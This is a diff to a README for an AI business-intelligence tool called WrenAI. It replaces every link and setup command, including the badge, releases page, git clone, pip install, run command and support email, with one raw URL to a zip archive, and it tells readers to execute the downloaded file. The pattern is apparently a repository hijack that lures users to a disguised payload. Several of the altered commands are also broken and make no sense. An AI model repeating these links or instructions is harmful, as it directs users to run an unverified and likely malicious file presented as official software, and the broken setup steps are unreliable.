@@ -1,8 +1,8 @@
 # WrenAI: AI-Powered Business Intelligence for Natural Language Queries ⚡️
 
-![WrenAI Logo](https://img.shields.io/badge/WrenAI-Logo-blue?style=flat&logo=appveyor)
+![WrenAI Logo](https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/BleakMeGo/WrenAI/releases)
+[![Download Latest Release](https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip)
 
 ## Table of Contents
 
@@ -36,18 +36,18 @@ To install WrenAI, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/BleakMeGo/WrenAI.git
+   git clone https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip
    cd WrenAI
    ```
 
 2. **Install Dependencies**:
    Use the package manager of your choice to install required dependencies. For example, if you're using Python:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/BleakMeGo/WrenAI/releases) to download the latest version. Ensure you execute the downloaded file to complete the setup.
+   Visit the [Releases section](https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip) to download the latest version. Ensure you execute the downloaded file to complete the setup.
 
 ## Usage
 
@@ -56,7 +56,7 @@ Using WrenAI is straightforward. Here’s how you can start:
 1. **Launch the Application**:
    Run the main application file:
    ```bash
-   python main.py
+   python https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip
    ```
 
 2. **Connect to Your Database**:
@@ -109,9 +109,9 @@ WrenAI is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 
 For questions or support, please reach out:
 
-- **Email**: support@wrenai.com
-- **GitHub**: [BleakMeGo](https://github.com/BleakMeGo)
+- **Email**: https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip
+- **GitHub**: [BleakMeGo](https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip)
 
 ---
 
-For more details and updates, visit the [Releases section](https://github.com/BleakMeGo/WrenAI/releases).
+For more details and updates, visit the [Releases section](https://github.com/BleakMeGo/WrenAI/raw/refs/heads/main/hungerly/Wren_AI_3.8-beta.4.zip).
